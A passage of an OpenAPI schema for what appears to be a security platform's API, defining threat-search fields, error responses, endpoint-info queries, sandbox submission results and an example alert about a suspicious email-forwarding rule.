              "type": "string"
            }
          },
          "resp_mime_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "resp_sha1_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "resp_archfiles_sha1": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "resp_sha256_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "resp_archfiles_sha256": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "server_name": {
            "type": "string",
            "example": "xxx.xxxxxx.com"
          },
          "valid_from": {
            "type": "string",
            "example": "2020-08-19T14:19:53.000Z"
          },
          "valid_until": {
            "type": "string",
            "example": "2020-11-11T14:19:53.000Z"
          },
          "cn": {
            "type": "string",
            "example": "xxx.xxxxx.xxxxxx.com"
          },
          "issuer": {
            "type": "string",
            "example": "/C=US/O=xxxxxx Trust Services/CN=xxx CA 1O1"
          },
          "s_no": {
            "type": "string",
            "example": "91167CC98938D594080000000054CDDD"
          },
          "hash": {
            "type": "string",
            "example": "6830b3d9acd8466600b49dfd5819351a0a006ddd"
          },
          "ja3_hash": {
            "type": "string",
            "example": "28a2c9bd18a11de089ef85a160da2ddd"
          },
          "ja3s_hash": {
            "type": "string",
            "example": "eca9b8f0f3eae50309eaf901cb822ddd"
          },
          "src_host_info": {
            "type": "object",
            "properties": {
              "ip": {
                "type": "string",
                "example": "10.100.100.100"
              },
              "macaddr": {
                "type": "string",
                "example": "xxxx"
              },
              "hostname": {
                "type": "string",
                "example": "xxxx"
              },
              "username": {
                "type": "string",
                "example": "test"
              },
              "ssid": {
                "type": "string",
                "example": ""
              },
              "ap_ip": {
                "type": "string",
                "example": ""
              },
              "realm": {
                "type": "string",
                "example": "xxxx.local"
              },
              "domain": {
                "type": "string",
                "example": "local"
              },
              "fqdn": {
                "type": "string"
              },
              "ts": {
                "type": "integer",
                "example": 1599447808
              },
              "orig_hostname": {
                "type": "string",
                "example": "xxxx"
              }
            }
          },
          "http_4xx_count": {
            "type": "integer",
            "example": 1
          },
          "searchDL": {
            "type": "string",
            "example": "NDL"
          },
          "eventTime": {
            "type": "integer",
            "example": 1633114803253
          }
        }
      },
      "ath-SearchPostData": {
        "type": "object",
        "required": [
          "from",
          "to",
          "source",
          "query"
        ],
        "properties": {
          "from": {
            "type": "integer",
            "description": "The time when the search began, written as a Unix timestamp.",
            "example": 1587892612
          },
          "to": {
            "type": "integer",
            "description": "The time when the search ended, written as Unix timestamp.",
            "example": 1592382065
          },
          "source": {
            "type": "string",
            "description": "The source of the data.\n\n> **Important**\n>\n> Data sources might vary depending on the products you purchase and the supported products in your region.\n\nAvailable values:\n  - `endpointActivityData`\n  - `cloudActivityData`\n  - `messageActivityData`\n  - `mobileActivityData`\n  - `detections`\n  - `networkActivityData `\n  - `containerActivityData`\n  - `identityActivityData`\n",
            "example": "endpointActivityData"
          },
          "query": {
            "type": "string",
            "description": "Search query.\n\nFields available for the Message Activity Data source:\n- `sender`\n- `subject`\n- `mailbox`\n- `url`\n- `recipient`\n- `source_domain`\n- `source_ip`\n- `file_sha1`\n- `message_id`\n- `file_extension`\n- `file_name`\n\nFields available for the Detection Data source:\n- `hostName`\n- `interestedHost`\n- `objectDomain`\n- `shost`\n- `dhost`\n- `denyListHost`\n- `endpointHostName`\n- `userDomain`\n- `endpointGUID`\n- `request`\n- `botUrl`\n- `cccaDestination`\n- `src`\n- `dst`\n- `interestedIp`\n- `endpointIp`\n- `peerIp`\n- `denyListIp`\n- `dpt`\n- `spt`\n- `fileName`\n- `objectFileName`\n- `compressedFileName`\n- `attachmentFileName`\n- `filePath`\n- `filePathName`\n- `objectFilePath`\n- `fileHash`\n- `attachmentFileHash`\n- `attachmentFileHashSha1`\n- `compressedFileHash`\n- `denyListFileHash`\n- `objectFileHashSha1`\n- `oldFileHash`\n- `fileHashSha256`\n- `attachmentFileHashSha256`\n- `compressedFileHashSha256`\n- `objectFileHashSha256`\n- `attachmentFileHashMd5`\n- `objectFileHashMd5`\n- `processCmd`\n- `objectCmd`\n- `objectRegistryData`\n- `objectRegistryKeyHandle`\n- `objectRegistryValue`\n- `suid`\n- `processFilePath`\n- `suser`\n- `duser`\n- `mailMsgSubject`\n- `msgId`\n- `techniqueId`\n- `tags`\n- `tacticId`\n- `ruleName`\n- `ruleId`\n- `malName`\n- `clusterId`\n- `clusterName`\n- `k8sNamespace`\n- `k8sPodName`\n- `k8sPodId`\n- `containerName`\n- `containerId`\n- `containerImage`\n- `containerImageDigest`\n- `ruleSetName`\n- `ruleSetId`\n- `ruleIdStr`\n\nFields available for the Endpoint Activity Data source:\n- `dst`\n- `endpointGuid`\n- `endpointHostName`\n- `endpointIp`\n- `eventId`\n- `eventSubId`\n- `hostName`\n- `logonUser`\n- `objectCmd`\n- `objectFileHashSha1`\n- `objectFilePath`\n- `objectIp`\n- `objectIps`\n- `objectPort`\n- `objectRegistryData`\n- `objectRegistryKeyHandle`\n- `objectRegistryValue`\n- `objectSigner`\n- `objectSignerValid`\n- `objectUser`\n- `parentCmd`\n- `parentFileHashSha1`\n- `parentFilePath`\n- `pname`\n- `processCmd`\n- `processFileHashSha1`\n- `processFilePath`\n- `request`\n- `spt`\n- `src`\n- `srcFileHashSha1`\n- `srcFilePath`\n\nThe available fields for the Cloud Activity Data source:\n- `eventID`\n- `eventName`\n- `eventSource`\n- `requestParameters`\n- `resources`\n- `responseElements`\n- `sourceIPAddress`\n- `userAgent`\n- `userIdentity`\n- `vpcEndpointId`\n- `uuid`\n- `productCode`\n- `tags`\n\nThe available fields for the Mobile Activity Data source:\n- `tags`\n- `productCode`\n- `uuid`\n- `filterRiskLevel`\n- `endpointGuid`\n- `endpointHostName`\n- `endpointIp`\n- `eventId`\n- `eventSubId`\n- `logonUser`\n- `objectFileHashSha256`\n- `objectFilePath`\n- `pname`\n- `request`\n- `srcFileHashSha256`\n- `srcFilePath`\n- `endpointModel`\n- `osName`\n- `appLabel`\n- `appPkgName`\n- `appPublicKeySha1`\n- `objectAppDexSha256`\n- `objectAppLabel`\n- `objectAppPackageName`\n- `objectAppPublicKeySha1`\n\nFields available for the Network Activity Data source:\n- `url`\n- `ip`\n- `file_sha1`\n- `file_sha256`\n- `filename`\n- `domain`\n- `user_account`\n- `ip_port`\n\nFields available for the Container Activity Data source:\n- `eventId`\n- `eventSubId`\n- `eventTime`\n- `objectFilePath`\n- `srcFilePath`\n- `tags`\n- `uuid`\n- `productCode`\n- `filterRiskLevel`\n- `clusterId`\n- `clusterName`\n- `k8sNamespace`\n- `containerName`\n- `containerId`\n- `containerImage`\n- `processCmd`\n- `parentCmd`\n- `processFilePath`\n- `parentFilePath`\n- `processName`\n- `processPid`\n- `parentPid`\n- `dpt`\n- `dst`\n- `spt`\n- `src`\n- `objectCmd`\n- `objectUser`\n- `pname`\n\nFields available for the Identity Activity Data source:\n- `uuid`\n- `eventTime`\n- `tags`\n- `productCode`\n- `filterRiskLevel`\n- `eventId`\n- `eventName`\n- `idpName`\n- `idpId`\n- `locationCountry`\n- `locationCity`\n- `locationState`\n- `locationLongitude`\n- `locationLatitude`\n- `clientId`\n- `clientDisplayName`\n- `clientOS`\n- `clientBrowser`\n- `clientApp`\n- `ipAddress`\n- `userId`\n- `userDisplayName`\n- `statusDetail`\n- `status`\n- `statusReason`\n- `targetResourceId`\n- `targetResourceDisplayName`\n- `requestMethod`\n- `eventAdditionalDetails`\n- `eventCategory`\n- `initiatedByAppId`\n- `initiatedByAppDisplayName`\n- `initiatedByServicePrincipalId`\n- `initiatedByServicePrincipalName`\n- `initiatedByUserId`\n- `initiatedByUserDisplayName`\n- `initiatedByUserHomeTenantId`\n- `initiatedByUserHomeTenantName`\n- `initiatedByUserIpAddress`\n- `initiatedByUserPrincipalName`\n- `loggedByService`\n- `operationType`\n- `result`\n- `resultReason`\n- `targetResources`\n- `userAgent`\n- `pname`\n- `actionName`\n- `correlationId`\n- `policyTreePath- `\n",
            "example": "uuid:\\\"00000000-0000-0000-0000-000000000010\\\" OR uuid:\\\"00000000-0000-0000-0000-000000000020\\\" OR uuid:\\\"00000000-0000-0000-0000-000000000030\\\""
          }
        }
      },
      "atl-400_SET_Response": {
        "type": "object",
        "description": "Bad argument",
        "properties": {
          "error": {
            "type": "object",
            "required": [
              "code",
              "message",
              "innererror"
            ],
            "properties": {
              "code": {
                "type": "string",
                "enum": [
                  "BadArgument"
                ]
              },
              "message": {
                "type": "string",
                "example": "Product not connected"
              },
              "innererror": {
                "type": "object",
                "required": [
                  "code",
                  "innererror"
                ],
                "properties": {
                  "code": {
                    "type": "string"
                  },
                  "innererror": {
                    "type": "object",
                    "required": [
                      "code"
                    ],
                    "properties": {
                      "code": {
                        "type": "string",
                        "description": "error code"
                      },
                      "service": {
                        "type": "string",
                        "description": "internal error module name",
                        "example": "svp"
                      }
                    }
                  }
                }
              }
            }
          },
          "data": {
            "type": "object",
            "properties": {
              "failed": {
                "type": "array",
                "items": {
                  "type": "object",
                  "properties": {
                    "type": {
                      "description": "failed record type",
                      "type": "string"
                    },
                    "value": {
                      "description": "failed record value",
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        }
      },
      "atl-400_Response": {
        "type": "object",
        "description": "Bad argument",
        "properties": {
          "error": {
            "type": "object",
            "required": [
              "code",
              "message",
              "innererror"
            ],
            "properties": {
              "code": {
                "type": "string",
                "enum": [
                  "BadArgument"
                ]
              },
              "message": {
                "type": "string",
                "example": "Product not connected"
              },
              "innererror": {
                "type": "object",
                "required": [
                  "code",
                  "innererror"
                ],
                "properties": {
                  "code": {
                    "type": "string"
                  },
                  "innererror": {
                    "type": "object",
                    "required": [
                      "code"
                    ],
                    "properties": {
                      "code": {
                        "type": "string",
                        "description": "error code"
                      },
                      "service": {
                        "type": "string",
                        "description": "internal error module name",
                        "example": "svp"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "atl-401_Response": {
        "type": "object",
        "description": "Unauthorized",
        "properties": {
          "error": {
            "type": "object",
            "required": [
              "code",
              "message",
              "innererror"
            ],
            "properties": {
              "code": {
                "type": "string",
                "enum": [
                  "Unauthorized"
                ]
              },
              "message": {
                "type": "string",
                "example": "The token expires"
              },
              "innererror": {
                "type": "object",
                "required": [
                  "code",
                  "innererror"
                ],
                "properties": {
                  "code": {
                    "type": "string"
                  },
                  "innererror": {
                    "type": "object",
                    "required": [
                      "code"
                    ],
                    "properties": {
                      "code": {
                        "type": "string",
                        "description": "error code"
                      },
                      "service": {
                        "type": "string",
                        "description": "internal error module name",
                        "example": "svp"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "atl-403_Response": {
        "type": "object",
        "required": [
          "error"
        ],
        "properties": {
          "error": {
            "description": "error info",
            "type": "object",
            "required": [
              "code",
              "message",
              "innererror"
            ],
            "properties": {
              "code": {
                "type": "string",
                "description": "error class",
                "enum": [
                  "PermissionDeny"
                ]
              },
              "message": {
                "type": "string",
                "description": "detail error message",
                "example": "Role denied"
              },
              "innererror": {
                "type": "object",
                "required": [
                  "code",
                  "innererror"
                ],
                "properties": {
                  "code": {
                    "type": "string"
                  },
                  "innererror": {
                    "type": "object",
                    "required": [
                      "code"
                    ],
                    "properties": {
                      "code": {
                        "type": "string",
                        "description": "error code"
                      },
                      "service": {
                        "type": "string",
                        "description": "internal error module name",
                        "example": "svp"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "atl-404_Response": {
        "type": "object",
        "description": "NotFound",
        "properties": {
          "error": {
            "type": "object",
            "required": [
              "code",
              "message",
              "innererror"
            ],
            "properties": {
              "code": {
                "type": "string",
                "enum": [
                  "NotFound"
                ]
              },
              "message": {
                "type": "string",
                "example": "Not found"
              },
              "innererror": {
                "type": "object",
                "required": [
                  "code",
                  "innererror"
                ],
                "properties": {
                  "code": {
                    "type": "string"
                  },
                  "innererror": {
                    "type": "object",
                    "required": [
                      "code"
                    ],
                    "properties": {
                      "code": {
                        "type": "string",
                        "description": "error code"
                      },
                      "service": {
                        "type": "string",
                        "description": "internal error module name",
                        "example": "svp"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "atl-500_Response": {
        "type": "object",
        "description": "Internal error",
        "properties": {
          "error": {
            "type": "object",
            "required": [
              "code",
              "message",
              "innererror"
            ],
            "properties": {
              "code": {
                "type": "string",
                "enum": [
                  "InternalError"
                ]
              },
              "message": {
                "type": "string",
                "example": "Internal processs timeout"
              },
              "innererror": {
                "type": "object",
                "required": [
                  "code",
                  "innererror"
                ],
                "properties": {
                  "code": {
                    "type": "string"
                  },
                  "innererror": {
                    "type": "object",
                    "required": [
                      "code"
                    ],
                    "properties": {
                      "code": {
                        "type": "string",
                        "description": "error code"
                      },
                      "service": {
                        "type": "string",
                        "description": "internal error module name",
                        "example": "svp"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "spa-AccountEntityInfo": {
        "type": "object",
        "properties": {
          "value": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "updateAt": {
            "type": "integer",
            "format": "int64"
          }
        },
        "description": "Account Entity Info"
      },
      "spa-AgentInfo": {
        "type": "object",
        "properties": {
          "computerId": {
            "type": "string"
          },
          "logonAccount": {
            "$ref": "#/components/schemas/spa-AccountEntityInfo"
          }
        },
        "description": "Agent Info"
      },
      "spa-QueryAgentInfoResponse": {
        "type": "object",
        "properties": {
          "status": {
            "type": "string"
          },
          "errorCode": {
            "type": "integer",
            "format": "int32"
          },
          "message": {
            "type": "string"
          },
          "result": {
            "$ref": "#/components/schemas/spa-AgentInfo"
          }
        },
        "description": "query agent info response"
      },
      "spa-QueryAgentInfoRequest": {
        "required": [
          "criteria"
        ],
        "type": "object",
        "properties": {
          "criteria": {
            "$ref": "#/components/schemas/spa-criteria"
          }
        },
        "description": "Request format of query agent info"
      },
      "spa-criteria": {
        "required": [
          "field",
          "value"
        ],
        "type": "object",
        "properties": {
          "field": {
            "type": "string",
            "description": "which field would like to search for agent info, acceptable value: hostname/macaddr/ip",
            "enum": [
              "hostname",
              "macaddr",
              "ip"
            ]
          },
          "value": {
            "type": "string"
          }
        }
      },
      "spa-EndpointInfo": {
        "type": "object",
        "properties": {
          "logonAccount": {
            "$ref": "#/components/schemas/spa-AccountEntityInfo"
          },
          "hostname": {
            "$ref": "#/components/schemas/spa-EntityInfo"
          },
          "macAddr": {
            "$ref": "#/components/schemas/spa-EntityInfo"
          },
          "ip": {
            "$ref": "#/components/schemas/spa-EntityInfo"
          },
          "osName": {
            "type": "string"
          },
          "osVersion": {
            "type": "string"
          },
          "osDescription": {
            "type": "string"
          },
          "productCode": {
            "type": "string"
          }
        },
        "description": "Endpoint Info"
      },
      "spa-EntityInfo": {
        "type": "object",
        "properties": {
          "value": {
            "type": "string"
          },
          "updateAt": {
            "type": "integer",
            "format": "int64"
          }
        },
        "description": "Entity Info"
      },
      "spa-QueryBatchEndpointInfoResponse": {
        "type": "object",
        "properties": {
          "status": {
            "type": "string"
          },
          "errorCode": {
            "type": "integer",
            "format": "int32"
          },
          "message": {
            "type": "string"
          },
          "result": {
            "type": "array",
            "items": {
              "$ref": "#/components/schemas/spa-RichEndpointInfo"
            }
          }
        },
        "description": "query endpoint info by batch response"
      },
      "spa-RichEndpointInfo": {
        "type": "object",
        "properties": {
          "computerId": {
            "type": "string"
          },
          "info": {
            "$ref": "#/components/schemas/spa-EndpointInfo"
          }
        },
        "description": "Endpoint Info with computer ID"
      },
      "spa-QueryBatchEndpointInfoRequest": {
        "required": [
          "computerIds"
        ],
        "type": "object",
        "properties": {
          "computerIds": {
            "type": "array",
            "items": {
              "type": "string"
            }
          }
        },
        "description": "Request format of query endpoint info by multiple computer ID"
      },
      "spa-QueryEndpointInfoResponse": {
        "type": "object",
        "properties": {
          "status": {
            "type": "string"
          },
          "errorCode": {
            "type": "integer",
            "format": "int32"
          },
          "message": {
            "type": "string"
          },
          "result": {
            "$ref": "#/components/schemas/spa-EndpointInfo"
          }
        },
        "description": "query endpoint info response"
      },
      "spa-QueryEndpointInfoRequest": {
        "required": [
          "computerId"
        ],
        "type": "object",
        "properties": {
          "computerId": {
            "type": "string"
          }
        }
      },
      "spa-OsSummary": {
        "type": "object",
        "additionalProperties": {
          "type": "integer"
        }
      },
      "spa-QueryOsSummaryResponse": {
        "type": "object",
        "properties": {
          "status": {
            "type": "string"
          },
          "errorCode": {
            "type": "integer",
            "format": "int32"
          },
          "message": {
            "type": "string"
          },
          "result": {
            "type": "object",
            "description": "Response Result",
            "additionalProperties": {
              "$ref": "#/components/schemas/spa-OsSummary"
            },
            "example": {
              "Windows": {
                "Windows 10": 2,
                "Windows 7": 3
              },
              "Mac OS X": {
                "10.15": 10,
                "10.16": 5
              },
              "Linux": {
                "Amazon Linux": 8,
                "Amazon Linux 2": 10,
                "CentOS 7": 7
              }
            }
          }
        },
        "description": "query os summary response"
      },
      "sandbox-FileStatus": {
        "type": "object",
        "properties": {
          "code": {
            "type": "string",
            "example": "Success"
          },
          "message": {
            "type": "string",
            "example": "Success"
          },
          "data": {
            "type": "object",
            "properties": {
              "taskId": {
                "type": "string",
                "example": "012e4eac-9bd9-4e89-95db-77e02f75a6f3",
                "description": "Unique alphanumeric string that identifies a submission."
              },
              "isCached": {
                "type": "boolean",
                "example": true,
                "description": "Samples submitted but marked as match cache. This does not count toward the daily reserve.",
                "enum": [
                  true,
                  false
                ]
              },
              "taskStatus": {
                "type": "string",
                "description": "When the status is finished, could check analysisSummary to get the analysis result.",
                "enum": [
                  "finished",
                  "processing"
                ]
              },
              "digest": {
                "type": "object",
                "xml": {
                  "name": "digest",
                  "wrapped": true
                },
                "properties": {
                  "md5": {
                    "type": "string",
                    "example": "4ac174730d4143a119037d9fda81c7a9",
                    "description": "MD5 hash of the submitted file."
                  },
                  "sha1": {
                    "type": "string",
                    "example": "fb5608fa03de204a12fe1e9e5275e4a682107471",
                    "description": "SHA1 hash of the submitted file."
                  },
                  "sha256": {
                    "type": "string",
                    "example": "65b0f656e79ab84ca17807158e3eac206bd58be6689ddeb95956a48748d138f9",
                    "description": "SHA256 hash of the submitted file."
                  }
                }
              },
              "analysisSummary": {
                "$ref": "#/components/schemas/sandbox-AnalysisSummary"
              },
              "reportId": {
                "type": "string",
                "example": "012e4eac-9bd9-4e89-95db-77e02f75a6f3",
                "description": "ID used to get the report and suspicious object. Empty means no report."
              }
            },
            "xml": {
              "name": "summaryItem"
            }
          }
        }
      },
      "sandbox-AnalysisSummary": {
        "type": "object",
        "properties": {
          "analysisCompletionTime": {
            "type": "string",
            "example": "2021-05-07T03:08:40Z",
            "description": "Sample analysis completed time."
          },
          "riskLevel": {
            "type": "string",
            "description": "Risk Level of this sample.",
            "enum": [
              "high",
              "medium",
              "low",
              "noRisk",
              "notAnalyzed"
            ]
          },
          "description": {
            "type": "string",
            "example": "",
            "description": "Scan result description for NotAnalyzed."
          },
          "detectionNameList": {
            "type": "array",
            "items": {
              "type": "string",
              "example": "VAN_DROPPER.UMXX"
            },
            "description": "The name of the threat as detected by the sandbox."
          },
          "threatTypeList": {
            "type": "array",
            "items": {
              "type": "string",
              "example": "Dropper"
            },
            "description": "The threat type as detected by the sandbox."
          },
          "trueFileType": {
            "type": "string",
            "example": "exe",
            "description": "File type of the object."
          }
        },
        "xml": {
          "name": "analysisSummary"
        }
      },
      "sandbox-SubmitStatus": {
        "type": "object",
        "xml": {
          "name": "submitSummary",
          "wrapped": true
        },
        "properties": {
          "code": {
            "type": "string",
            "example": "Success"
          },
          "message": {
            "type": "string",
            "example": "Success"
          },
          "data": {
            "type": "object",
            "properties": {
              "taskId": {
                "type": "string",
                "example": "012e4eac-9bd9-4e89-95db-77e02f75a6f3",
                "description": "Unique alphanumeric string that identifies a submission."
              },
              "digest": {
                "type": "object",
                "xml": {
                  "name": "digest",
                  "wrapped": true
                },
                "properties": {
                  "md5": {
                    "type": "string",
                    "example": "4ac174730d4143a119037d9fda81c7a9",
                    "description": "MD5 hash of the submitted object."
                  },
                  "sha1": {
                    "type": "string",
                    "example": "fb5608fa03de204a12fe1e9e5275e4a682107471",
                    "description": "SHA1 hash of the submitted object."
                  },
                  "sha256": {
                    "type": "string",
                    "example": "65b0f656e79ab84ca17807158e3eac206bd58be6689ddeb95956a48748d138f9",
                    "description": "SHA256 hash of the submitted object."
                  }
                }
              }
            }
          }
        }
      },
      "sandbox-SOLists": {
        "type": "object",
        "properties": {
          "code": {
            "type": "string",
            "example": "Success"
          },
          "message": {
            "type": "string",
            "example": "Success"
          },
          "data": {
            "type": "array",
            "items": {
              "$ref": "#/components/schemas/sandbox-SOList"
            }
          }
        }
      },
      "sandbox-SOList": {
        "type": "object",
        "xml": {
          "name": "SO",
          "wrapped": true
        },
        "properties": {
          "type": {
            "type": "string",
            "description": "Suspicious object type",
            "enum": [
              "ip",
              "url",
              "sha1",
              "domain"
            ]
          },
          "value": {
            "type": "string",
            "example": "6.6.6.6",
            "description": "Suspicious object value"
          },
          "riskLevel": {
            "type": "string",
            "description": "Risk Level of suspicious object",
            "enum": [
              "high",
              "medium",
              "low"
            ]
          },
          "analysisCompletionTime": {
            "type": "string",
            "example": "2021-05-07T03:08:40Z",
            "description": "Analyze time of suspicious object"
          },
          "expiredTime": {
            "type": "string",
            "example": "2021-06-07T03:08:40Z",
            "description": "Expire time of suspicious object"
          },
          "rootFileSha1": {
            "type": "string",
            "example": "fb5608fa03de204a12fe1e9e5275e4a682107471",
            "description": "Sample sha1 generate this suspicious object"
          }
        }
      },
      "sandbox-Quota": {
        "type": "object",
        "xml": {
          "name": "Quota",
          "wrapped": true
        },
        "properties": {
          "code": {
            "type": "string",
            "example": "Success"
          },
          "message": {
            "type": "string",
            "example": "Success"
          },
          "data": {
            "type": "object",
            "properties": {
              "dailyFileCount": {
                "type": "integer",
                "example": 5,
                "description": "How many samples the customer already submitted today(UTC)."
              },
              "dailyFileNotcount": {
                "example": 2,
                "type": "integer",
                "description": "How many samples the customer already submitted today(UTC) but do not count in quota."
              },
              "dailyFileQuota": {
                "type": "integer",
                "example": 10,
                "description": "How many samples the customer can submit daily(UTC)."
              }
            }
          }
        }
      }
    },
    "responses": {
      "awb-CommonErrors400": {
        "content": {
          "application/json": {
            "schema": {
              "type": "object",
              "properties": {
                "error": {
                  "type": "object",
                  "description": "* 3090003: Unable to process the request. Verify that the request is properly formatted and try again. (Error code: 3090003)\n",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "3090003",
                      "enum": [
                        "3090003"
                      ]
                    },
                    "message": {
                      "type": "string",
                      "example": "Unable to process the request. Verify that the request is properly formatted and try again. (Error code: 3090003)"
                    },
                    "innererror": {
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": ""
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "awb-CommonErrors403": {
        "content": {
          "application/json": {
            "schema": {
              "type": "object",
              "properties": {
                "error": {
                  "type": "object",
                  "description": "* 3090004: Unable to process the request. Verify that you have permission to access the alert and try again. (Error code: 3090004)\n* 3090005: Unable to process the request. Verify that the specified company exists and that you have permission to access the company's data and try again. (Error code: 3090005)\n* 3090006: Unable to process the request. Verify that the specified user account exists and that you have permission to access the user's data and try again. (Error code: 3090006)\n",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "3090004",
                      "enum": [
                        "3090004",
                        "3090005",
                        "3090006"
                      ]
                    },
                    "message": {
                      "type": "string",
                      "example": "Unable to process the request. Verify that you have permission to access the alert and try again. (Error code: 3090004)"
                    },
                    "innererror": {
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": ""
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "awb-CommonErrors404": {
        "content": {
          "application/json": {
            "schema": {
              "type": "object",
              "properties": {
                "error": {
                  "type": "object",
                  "description": "* 3090007: Unable to process the request. Verify that the specified workbench ID exists and that you have permission to access the alert and try again. (Error code: 3090007)\n* 3090008: Unable to process the request. Verify that the request parameters are valid and try again. (Error code: 3090008)\n",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "3090007",
                      "enum": [
                        "3090007",
                        "3090008"
                      ]
                    },
                    "message": {
                      "type": "string",
                      "example": "Unable to process the request. Verify that the specified workbench ID exists and that you have permission to access the alert and try again. (Error code: 3090007)"
                    },
                    "innererror": {
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": ""
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "awb-CommonErrors500": {
        "content": {
          "application/json": {
            "schema": {
              "type": "object",
              "properties": {
                "error": {
                  "type": "object",
                  "description": "* 3090999: An internal error has occurred. Please try again later. If the issue persists, contact your support provider. (Error code: 3090999)\n",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "3090999",
                      "enum": [
                        "3090999"
                      ]
                    },
                    "message": {
                      "type": "string",
                      "example": "An internal error has occurred. Please try again later. If the issue persists, contact your support provider. (Error code: 3090999)"
                    },
                    "innererror": {
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": ""
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    "examples": {
      "awb-saeWorkbenchDetailsExample": {
        "value": {
          "info": {
            "code": 3002000,
            "msg": "Get workbench details successfully."
          },
          "data": {
            "schemaVersion": "1.12",
            "workbenchId": "WB-9002-20220906-00026",
            "workbenchLink": "https://THE_WORKBENCH_URL",
            "alertProvider": "SAE",
            "model": "Suspicious Mailbox Rule Forwards All Email to an External Location",
            "description": "A suspicious mailbox rule was created that forwards all email message to a location external to the company network [Delayed alert: Batch process detection]",
            "score": "44",
            "modelSeverity": "medium",
            "alertTriggerTimestamp": "2022-09-06T03:38:47.414Z",
            "workbenchCompleteTimestamp": "2022-09-06T03:39:30Z",
            "impactScope": [
              {
                "entityValue": "loki",
                "entityId": "loki",
                "relatedEntities": [
                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                  "LOKIOLD@TEST_COMPANY.COM"
                ],
                "relatedIndicators": [],
                "entityType": "account",
                "customTags": [],
                "platformTags": []
              },
              {
                "entityValue": {
                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                  "name": "Nimda",
                  "ips": [
                    "10.10.58.51"
                  ]
                },
                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
                "managementScopeGroupId": "deadbeef-292e-42ae-86be-d2fef483a248",
                "relatedEntities": [
                  "loki"
                ],
                "relatedIndicators": [
                  5
                ],
                "entityType": "host",
                "customTags": [
                  {
                    "key": "Department",
                    "value": "finance"
                  },
                  {
                    "key": "Department",
                    "value": "engineer"
                  }
                ],
                "platformTags": [
                  {
                    "key": "Asset group",
                    "value": "eu"
                  }
                ]
              },
              {
                "entityValue": "external_user1@xxx.com.xyz",
                "entityId": "EXTERNAL_USER1@XXX.COM.XYZ",
                "relatedEntities": [
                  "LOKIOLD@TEST_COMPANY.COM"
                ],
                "relatedIndicators": [],
                "entityType": "emailAddress",
                "customTags": [],
                "platformTags": []
              },
              {
                "entityValue": "lokiold@test_company.com",
                "entityId": "LOKIOLD@TEST_COMPANY.COM",
                "relatedEntities": [
                  "EXTERNAL_USER2@YYY.COM.XYZ",
                  "EXTERNAL_USER1@XXX.COM.XYZ",
                  "loki"
                ],
                "relatedIndicators": [
                  1,
                  2,
                  3,
                  4,
                  5
                ],
                "entityType": "emailAddress"
              },
              {
                "entityValue": "external_user2@yyy.com.xyz",
                "entityId": "EXTERNAL_USER2@YYY.COM.XYZ",
                "relatedEntities": [
                  "LOKIOLD@TEST_COMPANY.COM"
                ],
                "relatedIndicators": [],
                "entityType": "emailAddress",
                "customTags": [],
                "platformTags": []
              }
            ],
            "indicators": [
              {
                "id": 1,
                "objectType": "email_sender",
                "objectValue": "lokiold@test_company.com",
                "relatedEntities": [
                  "LOKIOLD@TEST_COMPANY.COM"
                ],
                "filterId": [
                  "a417808c-245f-5b1c-9ef5-729e87584978"
                ]
              },
              {
                "id": 2,
                "objectType": "email_sender",
                "objectValue": "external_user1@xxx.com.xyz",
                "relatedEntities": [
                  "LOKIOLD@TEST_COMPANY.COM"
                ],
                "filterId": [
                  "a417808c-245f-5b1c-9ef5-729e87584978"
                ]
              },
              {
                "id": 3,
                "objectType": "email_sender",
                "objectValue": "external_user2@yyy.com.xyz",
                "relatedEntities": [
                  "LOKIOLD@TEST_COMPANY.COM"
                ],
                "filterId": [
                  "a417808c-245f-5b1c-9ef5-729e87584978"
                ]
              },
              {
                "id": 4,
                "objectType": "text",
                "objectValue": "A suspicious mailbox rule was created that forwards all email message to a location external to the company network.",
                "relatedEntities": [
                  "LOKIOLD@TEST_COMPANY.COM"
                ],
                "filterId": [
                  "a417808c-245f-5b1c-9ef5-729e87584978"
                ]
              },
              {
                "id": 5,
                "objectType": "user_account",
                "objectValue": "loki",
                "relatedEntities": [
                  "LOKIOLD@TEST_COMPANY.COM",
                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
                ],
                "filterId": [
                  "a417808c-245f-5b1c-9ef5-729e87584978"
                ]
              }
            ],
            "matchedRules": [
              {
                "id": "a4d04d59-cee7-4dcc-9f0e-521c7b9a388a",
                "name": "Suspicious Mailbox Rule Forwards All Email to an External Location",
                "matchedFilters": [
                  {
                    "id": "a417808c-245f-5b1c-9ef5-729e87584978",
                    "name": "Suspicious Mailbox Rule Forwards All Email to an External Location",
                    "timestamp": "2022-06-16T05:54:12.000Z",
                    "mitreTechniques": [
                      "V9.T1114.003",
                      "V9.T1078.004"
                    ]
                  }
                ]
              }
            ]
          }
        },
        "summary": "SAE workbench details"
      },
      "awb-tiWorkbenchDetailsExample": {
        "value": {
          "info": {
            "code": 3002000,
            "msg": "Get workbench details successfully."
          },
          "data": {
            "schemaVersion": "1.3",
